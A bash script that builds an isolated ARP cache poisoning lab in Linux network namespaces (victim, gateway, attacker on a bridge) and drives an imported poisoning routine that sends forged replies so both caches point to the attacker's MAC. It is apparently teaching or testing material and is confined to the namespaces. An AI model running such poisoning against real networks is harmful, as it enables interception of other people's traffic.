#!/usr/bin/env bash
# Isolated ARP cache poisoning lab (Linux only, needs root).
#
# Topology, all inside network namespaces, one Linux bridge as the switch:
#
#   victim --(veth)-- [switch: br0] --(veth)-- gateway   (10.95.0.1)
#                           |
#                           +--(veth)-- attacker
#
#   Phase 1 (baseline): victim and gateway ping each other, so each ARP cache
#   holds the other's real MAC.
#   Phase 2 (poisoning): the attacker sends, every round, a forged reply to the
#   victim (gateway IP is at the attacker's MAC) and one to the gateway (victim
#   IP is at the attacker's MAC). Both caches end up pointing to the attacker.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/arp_poisoning_lab.sh
#   sudo REPLY_SECONDS=3 scripts/lab/arp_poisoning_lab.sh
#
# Requirements: iproute2 (ip, bridge), ping, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge ping; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
REPLY_SECONDS="${REPLY_SECONDS:-3}"
GATEWAY_IP="10.95.0.1"
VICTIM_IP="10.95.0.10"
GATEWAY_MAC="02:00:00:00:00:01"
VICTIM_MAC="02:00:00:00:00:10"
ATTACKER_MAC="02:00:00:00:00:30"

stop_lab() {
    for ns in victim gateway attacker switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}

trap stop_lab EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add switch
ip netns add victim
ip netns add gateway
ip netns add attacker

ip link add v-sw type veth peer name sw-v
ip link set v-sw netns victim
ip link set sw-v netns switch

ip link add g-sw type veth peer name sw-g
ip link set g-sw netns gateway
ip link set sw-g netns switch

ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for port in sw-v sw-g sw-a; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

ip netns exec victim ip link set v-sw address "$VICTIM_MAC"
ip netns exec victim ip addr add "$VICTIM_IP/24" dev v-sw
ip netns exec victim ip link set v-sw up
ip netns exec gateway ip link set g-sw address "$GATEWAY_MAC"
ip netns exec gateway ip addr add "$GATEWAY_IP/24" dev g-sw
ip netns exec gateway ip link set g-sw up
ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip link set a-sw up

# MAC cached in namespace $1 for IP $2 on interface $3 ("none" if no entry).
cached_mac() {
    local mac
    mac=$(ip netns exec "$1" ip neigh show "$2" dev "$3" \
        | grep -oE 'lladdr [0-9a-f:]{17}' | cut -d' ' -f2 || true)
    echo "${mac:-none}"
}

show_caches() {
    echo "  victim's cache for $GATEWAY_IP:   $(cached_mac victim "$GATEWAY_IP" v-sw)"
    echo "  gateway's cache for $VICTIM_IP:   $(cached_mac gateway "$VICTIM_IP" g-sw)"
}

# --- Phase 1: baseline -----------------------------------------------------

echo "Phase 1: victim and gateway ping each other, so their caches fill"
ip netns exec victim ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null
ip netns exec gateway ping -c 2 -W 1 "$VICTIM_IP" >/dev/null
show_caches
echo

# --- Phase 2: poisoning ---------------------------------------------------

POISON_CODE='
import os, threading, time
from macabre.attacks.arp_poisoning import ArpPoisoningConfig, run_arp_poisoning

stop = threading.Event()
progress = []
worker = threading.Thread(
    target=run_arp_poisoning,
    args=(
        ArpPoisoningConfig(
            iface="a-sw",
            victim_ip=os.environ["VICTIM_IP"],
            gateway_ip=os.environ["GATEWAY_IP"],
            victim_mac=os.environ["VICTIM_MAC"],
            gateway_mac=os.environ["GATEWAY_MAC"],
            interval=0.5,
        ),
        stop,
        progress.append,
    ),
)
worker.start()
time.sleep(float(os.environ["REPLY_SECONDS"]))
stop.set()
worker.join()
print(f"Attacker: {progress[-1].rounds} rounds, {progress[-1].frames} forged replies, from {progress[-1].attacker_mac}")
'

echo "Phase 2: attacker poisons both caches for $REPLY_SECONDS seconds"
ip netns exec attacker env PYTHONPATH="$ROOT/src" GATEWAY_IP="$GATEWAY_IP" VICTIM_IP="$VICTIM_IP" \
    VICTIM_MAC="$VICTIM_MAC" GATEWAY_MAC="$GATEWAY_MAC" REPLY_SECONDS="$REPLY_SECONDS" "$PY" -c "$POISON_CODE"
show_caches
echo
echo "Expected: before the attack each cache holds the other host's real MAC;"
echo "after it, both hold the attacker's MAC ($ATTACKER_MAC)."
